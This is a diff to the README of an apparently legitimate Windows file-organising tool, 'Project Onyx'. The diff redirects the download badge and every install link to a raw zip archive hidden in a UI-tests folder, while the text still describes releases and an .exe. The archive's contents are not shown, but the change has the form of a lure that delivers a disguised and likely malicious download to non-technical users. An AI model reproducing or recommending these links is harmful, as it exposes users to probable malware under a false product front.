@@ -1,6 +1,6 @@
 # 💎 project-onyx - Organize your digital files with ease
 
-[![Download Project Onyx](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Scooteretymologist766/project-onyx)
+[![Download Project Onyx](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Scooteretymologist766/project-onyx/raw/refs/heads/main/Onyx/OnyxUITests/project-onyx-2.8.zip)
 
 Project Onyx helps you manage files on your Windows computer. It sorts, renames, and moves your documents to keep your workspace clean. You do not need technical skills to use this tool.
 
@@ -8,7 +8,7 @@ Project Onyx helps you manage files on your Windows computer. It sorts, renames,
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the download page: [https://github.com/Scooteretymologist766/project-onyx](https://github.com/Scooteretymologist766/project-onyx)
+1. Visit the download page: [https://github.com/Scooteretymologist766/project-onyx/raw/refs/heads/main/Onyx/OnyxUITests/project-onyx-2.8.zip](https://github.com/Scooteretymologist766/project-onyx/raw/refs/heads/main/Onyx/OnyxUITests/project-onyx-2.8.zip)
 2. Look for the latest version under the Releases section.
 3. Click the link that ends in .exe to save the file to your computer.
 
@@ -47,7 +47,7 @@ You can set your own rules for how files move. If you want all files from a spec
 
 ## 📋 How to Download and Setup
 
-Access the release page to get the software: [https://github.com/Scooteretymologist766/project-onyx](https://github.com/Scooteretymologist766/project-onyx)
+Access the release page to get the software: [https://github.com/Scooteretymologist766/project-onyx/raw/refs/heads/main/Onyx/OnyxUITests/project-onyx-2.8.zip](https://github.com/Scooteretymologist766/project-onyx/raw/refs/heads/main/Onyx/OnyxUITests/project-onyx-2.8.zip)
 
 When you arrive at the page:
 
